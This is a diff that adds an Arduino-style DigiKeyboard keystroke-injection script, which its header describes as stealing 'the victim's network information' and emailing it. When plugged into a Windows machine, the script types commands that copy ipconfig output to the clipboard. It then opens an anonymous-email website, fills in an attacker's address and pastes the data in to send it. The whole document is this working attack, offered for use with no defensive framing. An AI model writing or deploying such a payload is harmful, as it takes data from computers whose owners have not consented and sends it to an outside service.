@@ -1,0 +1,52 @@
+This payload copies the victim's network information and sends it to your email.
+
+(Runs only once)
+
+  #include "DigiKeyboard.h"
+  #define KEY_TAB  43
+  void setup() {
+    DigiKeyboard.sendKeyStroke(0);
+    DigiKeyboard.delay(500);
+    DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
+    DigiKeyboard.delay(200);
+    DigiKeyboard.println("cmd");
+    DigiKeyboard.sendKeyStroke(KEY_ENTER);
+    DigiKeyboard.delay(400);
+    DigiKeyboard.println("ipconfig | clip & exit");
+    DigiKeyboard.sendKeyStroke(KEY_ENTER);
+    DigiKeyboard.delay(400);
+    DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
+    DigiKeyboard.delay(200);
+    DigiKeyboard.println("http://anonymouse.org/anonemail.html");
+    DigiKeyboard.sendKeyStroke(KEY_ENTER);
+    DigiKeyboard.delay(5000);
+    DigiKeyboard.sendKeyStroke(KEY_TAB);
+    DigiKeyboard.delay(50);
+    DigiKeyboard.sendKeyStroke(KEY_TAB);
+    DigiKeyboard.delay(50);
+    DigiKeyboard.sendKeyStroke(KEY_TAB);
+    DigiKeyboard.delay(50);
+    DigiKeyboard.sendKeyStroke(KEY_TAB);
+    DigiKeyboard.delay(50);
+    DigiKeyboard.sendKeyStroke(KEY_TAB);
+    DigiKeyboard.delay(50);
+    DigiKeyboard.println("YOUREMAILHERE");
+    DigiKeyboard.delay(50);
+    DigiKeyboard.sendKeyStroke(KEY_TAB);
+    DigiKeyboard.delay(50);
+    DigiKeyboard.println("ipsnatch");
+    DigiKeyboard.delay(50);
+    DigiKeyboard.sendKeyStroke(KEY_TAB);
+    DigiKeyboard.delay(50);
+    DigiKeyboard.sendKeyStroke(KEY_V, MOD_CONTROL_LEFT);
+    DigiKeyboard.delay(200);
+    DigiKeyboard.sendKeyStroke(KEY_TAB);
+    DigiKeyboard.delay(50);
+    DigiKeyboard.sendKeyStroke(KEY_ENTER);
+    DigiKeyboard.delay(3000);
+    DigiKeyboard.sendKeyStroke(KEY_F4, MOD_ALT_LEFT);
+  }
+
+
+  void loop() {
+  }
